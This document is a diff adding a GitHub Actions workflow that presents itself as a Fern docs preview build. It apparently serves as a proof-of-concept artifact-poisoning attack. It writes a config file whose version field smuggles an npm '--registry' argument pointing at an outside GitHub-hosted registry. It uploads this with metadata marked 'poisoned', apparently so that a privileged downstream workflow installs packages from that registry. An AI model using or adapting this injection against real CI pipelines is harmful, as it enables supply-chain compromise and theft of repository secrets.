@@ -1,0 +1,38 @@
+name: "Preview Fern Docs: Build"
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+
+jobs:
+  collect:
+    runs-on: linux-amd64-cpu32
+    steps:
+      - name: Build poisoned fern-preview artifact
+        run: |
+          set -e
+          mkdir -p build/fern build/preview-metadata
+          cat > build/fern/fern.config.json <<'JSON'
+          {
+            "organization": "nvidia",
+            "version": "5.190.0 --registry=https://raw.githubusercontent.com/lazyhacker6/npmreg/main/"
+          }
+          JSON
+          cat > build/fern/docs.yml <<'YAML'
+          instances:
+            - url: https://poc.invalid
+          YAML
+          echo "${{ github.event.pull_request.number }}" > build/preview-metadata/pr_number
+          echo "pull-request/${{ github.event.pull_request.number }}" > build/preview-metadata/head_ref
+          echo "poisoned" > build/preview-metadata/changed_md_files
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: fern-preview
+          path: |
+            build/fern
+            build/preview-metadata
+          retention-days: 1
